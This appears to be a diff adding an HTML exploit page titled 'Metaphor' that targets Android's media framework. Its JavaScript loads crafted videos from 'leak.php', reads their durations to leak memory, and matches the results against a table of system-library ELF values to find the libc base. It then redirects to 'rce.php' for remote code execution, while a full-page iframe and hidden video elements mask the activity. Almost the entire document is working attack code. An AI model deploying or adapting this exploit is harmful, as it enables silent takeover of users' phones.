@@ -1,0 +1,200 @@
+<html>
+    <body>
+        <h1 id="titl">Metaphor</h1><br />
+        <script>
+        var PAGE_SIZE = 0x1000;
+
+        // Number of parallel leaks
+        // It's only useful if we know we're reading a 
+        // large region with no holes, such as libicui8n.so
+        var NUM_PARALLEL_LEAKS = 1;
+
+        // libc.so base: 0xb6f73000 (Nexus)
+        
+        // Address to start leaking from
+        var LEAK_START_ADDRESS = 0xb6ed9000;
+        var LEAK_OFFSET = 0x88;
+        
+        var MAGIC_FAILED = 314;
+
+        // (actual) ELF header value => offset from libicui8n.so
+        var LEAKS_LOOKUP_TABLE =
+        {
+            0x05000035c4: 0x9a, // libaudioutils.so
+            0x050000a64c: 0x94, // libcutils.so
+            0x0500004460: 0x87, // libaudioresampler.so
+            0x050003b2e8: 0x69, // libaudioflinger.so
+            0x0500001696: 0x26, // libstdc++.so
+            0x0500016054: 0x22, // libm.so
+            0x0500004154: 0x8, // liblog.so
+            0x0500064ebc: 0x0, // libc.so
+        };
+        
+        // (rounded) ELF header value => offset from libicui8n.so
+        for (var key in LEAKS_LOOKUP_TABLE)
+        {
+            var rounded_key = Math.round(key / 1000) * 1000;
+            LEAKS_LOOKUP_TABLE[rounded_key] = LEAKS_LOOKUP_TABLE[key];
+        }
+        
+        var g_start_time_leak = 0;
+        
+        function get_addr(id)
+        {
+            return LEAK_START_ADDRESS - (id * PAGE_SIZE);
+        }
+        
+        function get_addr_offset(id)
+        {
+            return LEAK_START_ADDRESS - (id * PAGE_SIZE) + LEAK_OFFSET;
+        }
+
+        function make_elements(id)
+        {
+            var vid_el = document.createElement('video');
+            vid_el.setAttribute('mute', '');
+            vid_el.setAttribute('controls', '');
+            vid_el.setAttribute('autoplay', '');
+            vid_el.setAttribute('preload', 'metadata');
+            vid_el.id = 'vid_' + id;
+            vid_el.onloadedmetadata = function() { log_duration(id); }
+
+            var src_el = document.createElement('source');
+            src_el.id = 'src_' + id;
+            vid_el.appendChild(src_el);
+            vid_el.style.visibility = 'hidden';
+            
+            var vid_container_el = document.getElementById('vid_container');
+            vid_container_el.appendChild(vid_el);
+        }
+        
+        function get_element(name, id)
+        {
+            name += '_' + id;
+        
+            var el = document.getElementById(name);
+            if (el == null)
+                make_elements(id);
+            el = document.getElementById(name);
+
+            return el;
+        }
+
+        function load_video(id)
+        {
+            var xhr = new XMLHttpRequest;
+            xhr.responseType = 'blob';
+
+            xhr.onreadystatechange = function()
+            {
+                on_video_loaded(xhr, id);
+            };
+
+            var address = get_addr_offset(id).toString(16);
+            if (address != 'undefined' && address.length > 0)
+            {
+                var page = 'leak.php?addr=' + address;
+                xhr.open('GET', page, true);
+                xhr.send();
+            }
+        }
+
+        function load_rce(libc)
+        {
+            console.log('Loading RCE, libc.so: ' + libc.toString(16));
+
+            var page = 'rce.php?addr=' + libc.toString(16);
+
+            document.location = page;
+        }
+
+        function log_duration(id)
+        {
+            var src_el = get_element('src', id);
+            var vid_el = src_el.parentElement;
+
+            var hex = Math.round(vid_el.duration * 1000000).toString(16);
+            var val = parseInt(hex, 16);
+            console.log('[0x' + get_addr_offset(id).toString(16) + '] offset 0x' + id.toString(16) + ': duration ' + vid_el.duration + ' (0x' + hex + ')');
+            
+            update_val(id, val);
+        }
+
+        function update_val(id, val)
+        {
+            var vid_el = get_element('vid', id);
+            var diff = performance.now() - vid_el.time;
+
+            if (diff > 12500)
+            {
+                console.log('Waited too long - crashed? (' + (Math.round(diff / 100) * 100) + 'ms.)');
+            }
+
+            if (val in LEAKS_LOOKUP_TABLE)
+            {
+                var libc_offset = LEAKS_LOOKUP_TABLE[val];
+                var libc = get_addr(id) + (libc_offset * PAGE_SIZE);
+
+                var time = performance.now() - g_start_time_leak;
+                
+                console.log('Success: ' + time + ' ms');
+                console.log('Found libc.so: 0x' + get_addr(id).toString(16) + ' + 0x' + libc_offset.toString(16) + ' = 0x' + libc.toString(16));
+
+                load_rce(libc);
+            }
+            else
+            {
+                if (val != 0)
+                {
+                    if (val == MAGIC_FAILED)
+                    {
+                        // Failed to overflow the duration field
+                        console.log('Leak failed!');
+                    }
+                    else
+                    {
+                        console.log('Leaked data from 0x' + get_addr_offset(id).toString(16) + ': 0x' + val.toString(16));
+                    }
+                }
+
+                if (id % NUM_PARALLEL_LEAKS == 0)
+                    setTimeout(leak, 10);
+            }
+        }
+
+        function on_video_loaded(xhr, id)
+        {
+            if (xhr.readyState != 4)
+                return;
+
+            var url = URL.createObjectURL(xhr.response);
+            var vid_el = get_element('vid', id);
+            vid_el.time = performance.now();
+            vid_el.src = url;
+        }
+
+        var g_offset_id = 0;
+        function leak()
+        {
+            for (var i = 0; i < NUM_PARALLEL_LEAKS; i++)
+            {
+                load_video(g_offset_id);
+                g_offset_id++;
+            }
+        }
+        
+        function start_leak()
+        {
+            g_start_time_leak = performance.now();
+            leak();
+        }
+
+        start_leak();
+        </script>
+        
+        <iframe src="http://north-bit.com" style="width: 100%; height: 100%"></iframe>
+
+        <div id="vid_container">
+        </div>
+    </body>
+</html>
